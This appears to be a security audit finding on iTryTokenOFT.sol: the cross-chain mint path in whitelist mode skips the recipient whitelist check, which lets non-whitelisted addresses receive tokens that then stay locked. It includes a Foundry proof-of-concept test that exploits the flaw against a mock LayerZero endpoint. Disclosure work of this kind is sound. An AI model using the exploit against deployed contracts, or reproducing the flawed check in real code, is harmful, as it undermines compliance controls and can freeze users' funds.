  "body": "## Finding description and impact\n\nIn `iTryTokenOFT.sol`, the `_beforeTokenTransfer` function enforces access control based on the `transferState`. When the system is in `TransferState.WHITELIST_ENABLED` mode, the logic for handling incoming cross-chain transfers (minting) is flawed.\n\nSpecifically, when a mint operation occurs (triggered by the LayerZero endpoint via `lzReceive` -\\> `_credit` -\\> `_mint`), the condition checks if the recipient is blacklisted but **fails to check if the recipient is whitelisted**.\n\n```\n// Current flawed logic in iTryTokenOFT.sol\n} else if (transferState == TransferState.WHITELIST_ENABLED) {\n    // VULNERABILITY HERE: Missing && whitelisted[to] check\n    } else if (msg.sender == minter && from == address(0) && !blacklisted[to]) {\n    } \n```\n\n**Impact:**\n\n1. **Compliance Invariant Violation:**  The protocol explicitly states:  *&quot;Only whitelisted user can send/receive/burn iTry tokens in a WHITELIST_ENABLED transfer state.&quot;*  This bug allows non-whitelisted users to receive tokens on the Spoke chain via cross-chain bridging, bypassing KYC/compliance requirements.\n2. **Fund Lock (Honeypot Risk):**  This is the most severe impact. While a non-whitelisted user can *receive* tokens due to this bug, they **cannot transfer or bridge them back**.\n\n    * Standard transfers require `whitelisted[from] && whitelisted[to]`.\n    * Bridging back (burning) requires `whitelisted[from]`.\n    * Since the user successfully received tokens but is not whitelisted, any attempt to move these funds will revert. The user's funds are effectively frozen until an admin manually intervenes.\n\n## Recommended mitigation steps\n\nModify the minting condition in the WHITELIST_ENABLED block of _beforeTokenTransfer to strictly enforce that the recipient (to address) must be whitelisted.",
  "proof_of_concept": "The following test demonstrates that a non-whitelisted user (`attacker`) can receive tokens via a simulated LayerZero message, but subsequently cannot transfer them, proving both the bypass and the fund lock.\n\nCreate a file named `test/ReproduceExploit.t.sol`.\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.20;\n\nimport \"forge-std/Test.sol\";\nimport \"src/token/iTRY/crosschain/iTryTokenOFT.sol\";\nimport {IiTryDefinitions} from \"src/token/iTRY/IiTryDefinitions.sol\";\nimport {Origin} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/interfaces/IOAppReceiver.sol\";\nimport {MockLayerZeroEndpoint} from \"test/mocks/MockLayerZeroEndpoint.sol\"; \n\ncontract ReproduceExploit is Test {\n    iTryTokenOFT public token;\n    MockLayerZeroEndpoint public mockEndpoint; \n    address public owner = address(0x1);\n    address public attacker = address(0xBAD); // This address is not whitelisted\n    \n    // Define mock source chain ID and sender\n    uint32 constant SRC_EID = 1;\n    address constant REMOTE_SENDER = address(0xCAFE);\n\n    function setUp() public {\n        // 2. Deploy existing Mock contract\n        mockEndpoint = new MockLayerZeroEndpoint();\n\n        // 3. Deploy iTryTokenOFT\n        vm.prank(owner);\n        token = new iTryTokenOFT(address(mockEndpoint), owner);\n\n        // 4. [Fix] Configure Peer: Trust REMOTE_SENDER from SRC_EID\n        // This step resolves the NoPeer(1) error\n        vm.prank(owner);\n        token.setPeer(SRC_EID, bytes32(uint256(uint160(REMOTE_SENDER))));\n\n        // 5. Set transfer state to WHITELIST_ENABLED\n        vm.prank(owner);\n        token.updateTransferState(IiTryDefinitions.TransferState.WHITELIST_ENABLED);\n    }\n\n    function test_BypassWhitelistAndFundLock() public {\n        // [Pre-check] Ensure attacker is neither whitelisted nor blacklisted\n        assertFalse(token.whitelisted(attacker), \"Attacker should not be whitelisted\");\n        assertFalse(token.blacklisted(attacker), \"Attacker should not be blacklisted\");\n\n        // [Step 1] Simulate cross-chain minting message\n        // Construct standard OFT message payload: [bytes32 toAddress][uint64 amountSD]\n        uint64 amountSD = 1000;\n        bytes32 toAddressBytes = bytes32(uint256(uint160(attacker)));\n        bytes memory message = abi.encodePacked(toAddressBytes, amountSD);\n\n        // Construct LayerZero message origin info\n        Origin memory origin = Origin({\n            srcEid: SRC_EID, \n            sender: bytes32(uint256(uint160(REMOTE_SENDER))), // Must match address in setPeer\n            nonce: 1\n        });\n\n        // [Step 2] Simulate Endpoint calling lzReceive\n        // Trigger chain: lzReceive -> _lzReceive -> _credit -> _mint -> _beforeTokenTransfer\n        // In _beforeTokenTransfer, msg.sender is mockEndpoint (minter), triggering the vulnerability\n        vm.prank(address(mockEndpoint));\n        token.lzReceive(\n            origin,\n            bytes32(0), // guid\n            message,\n            address(0), // executor\n            \"\" // extraData\n        );\n\n        // [Verification 1] Confirm non-whitelisted user successfully received tokens (Whitelist Bypassed)\n        uint256 balance = token.balanceOf(attacker);\n        console.log(\"Attacker Balance after exploit:\", balance);\n        assertGt(balance, 0, \"Attacker should have successfully received tokens (Bypassed Whitelist)\");\n\n        // [Step 3] Verify fund lock (Honeypot effect)\n        // attacker tries to transfer tokens out\n        address recipient = address(0x2);\n        \n        vm.startPrank(attacker);\n        // Expect revert: Normal transfer logic correctly checks whitelist\n        // else if (whitelisted[msg.sender] && whitelisted[from] && whitelisted[to])\n        vm.expectRevert(IiTryDefinitions.OperationNotAllowed.selector);\n        token.transfer(recipient, balance);\n        vm.stopPrank();\n        \n        console.log(\"Transfer failed as expected (Funds are locked)\");\n    }\n}\n```",
